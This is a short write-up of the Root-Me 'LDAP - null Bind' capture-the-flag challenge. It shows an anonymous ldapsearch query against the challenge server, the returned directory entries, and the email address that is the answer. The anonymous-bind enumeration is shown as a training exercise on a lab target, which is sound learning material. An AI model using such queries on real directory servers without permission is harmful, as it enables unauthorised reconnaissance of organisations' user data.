---
title: LDAP - null Bind
date: '2022-08-31'
tags: ['ftp', 'root-me', 'writeups','network']
draft: false
summary: Writeup of LDAP - null Bind file challenges.
---

# Option 1: ldapadmin

![image](https://user-images.githubusercontent.com/61643034/187846896-7d000d04-4ef4-4bab-b3d7-a45d2699eea6.png)



# Option2
The Challenge’s title reveals we’ll be using LDAP Null Bind to solve it.
The information also reveals that we might be looking for someone for the anonymous OU.

On a Unix system, use ldapsearch to perform a query against the LDAP server.

Using the following command, we’ll retrieve the info we need:

 -x = Simple authentication
 -b = base dn for search
 -H = LDAP Uniform Resource Identifier(s) You could also use -h and -p for this

```ldapsearch -x -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" -H "ldap://challenge01.root-me.org:54013"```

The result of this command is:
```
# extended LDIF
#
# LDAPv3
# base <ou=anonymous,dc=challenge01,dc=root-me,dc=org> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# anonymous, challenge01.root-me.org
dn: ou=anonymous,dc=challenge01,dc=root-me,dc=org
objectClass: organizationalUnit
ou: anonymous

# sabu, anonymous, challenge01.root-me.org
dn: uid=sabu,ou=anonymous,dc=challenge01,dc=root-me,dc=org
objectClass: inetOrgPerson
objectClass: shadowAccount
uid: sabu
sn: sabu
cn: sabu
givenName: sabu
mail: sabu@anonops.org

# search result
search: 2
result: 0 Success
```
 numResponses: 3
 
 numEntries: 2
 
As such revealing the email address we’re looking for: ```sabu@anonops.org```
